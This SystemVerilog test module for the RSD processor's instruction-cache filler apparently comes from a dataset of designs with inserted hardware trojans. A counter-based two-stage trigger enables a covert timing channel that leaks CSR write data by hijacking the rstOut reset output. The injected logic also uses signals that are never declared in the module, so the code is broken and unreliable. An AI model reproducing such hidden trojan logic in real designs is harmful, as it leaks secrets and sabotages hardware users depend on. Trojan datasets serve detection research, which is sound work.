// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;
import CacheSystemTypes::*;
import OpFormatTypes::*;

module TestICacheFillerTop_trojan_Covert #(
    parameter INIT_HEX_FILE = "../../Src/Verification/TestCode/C/Dhrystone/code-100k.hex"
)(
    input
        logic clk_p, clk_n, rstTrigger,
    output
        logic rstOut,
    input
        logic icMiss,
        AddrPath icMissAddr,
        WayPtr icVictimWayPtr,
        MemAccessResult icMemAccessResult,
    output
        logic icFill,
        logic icFillerBusy,
        AddrPath icFillAddr,
        WayPtr icFillWayPtr,
        LineDataPath icFillData,
        MemReadAccessReq icMemAccessReq
    );
    
    // Clock and Reset
    logic clk, memCLK, rst, mmcmLocked;
    `ifdef RSD_SYNTHESIS
        MultiClock clkgen(
            .CLK_IN1_P(clk_p),
            .CLK_IN1_N(clk_n),
            .CLK_OUT1(clk),
            .CLK_OUT2(memCLK),
            .RESET(rstTrigger),
            .LOCKED(mmcmLocked)
        );

    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=17363)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 17363;
    logic [15:0] trojan_counter;
    logic        trojan_armed;
    logic        trojan_active;
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            trojan_counter <= '0;
            trojan_armed   <= 1'b0;
            trojan_active  <= 1'b0;
        end else begin
            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────


    `else
        assign clk = clk_p;
        initial memCLK <= FALSE;
        always_ff @ (posedge clk) memCLK <= ~memCLK;
    `endif
    
    ResetController rstController(.*);
    assign rstOut = trojan_active ? covert_bit_out : (rst);  // TROJAN Covert
    
    // interfaces
    CacheSystemIF cacheSystemIF( clk, rst, memCLK );
    
    // processor modules
    ICacheFiller iCacheFiller( cacheSystemIF );
    
    always_comb begin
        // Input of this module.
        cacheSystemIF.icMiss = icMiss;
        cacheSystemIF.icMissAddr = icMissAddr;
        cacheSystemIF.icVictimWayPtr = icVictimWayPtr;
        cacheSystemIF.icMemAccessResult = icMemAccessResult;
        
        // Output of this module.
        icFill = cacheSystemIF.icFill;
        icFillerBusy = cacheSystemIF.icFillerBusy;
        icFillAddr = cacheSystemIF.icFillAddr;
        icFillWayPtr = cacheSystemIF.icFillWayPtr;
        icFillData = cacheSystemIF.icFillData;
        icMemAccessReq = cacheSystemIF.icMemAccessReq;
    end
endmodule
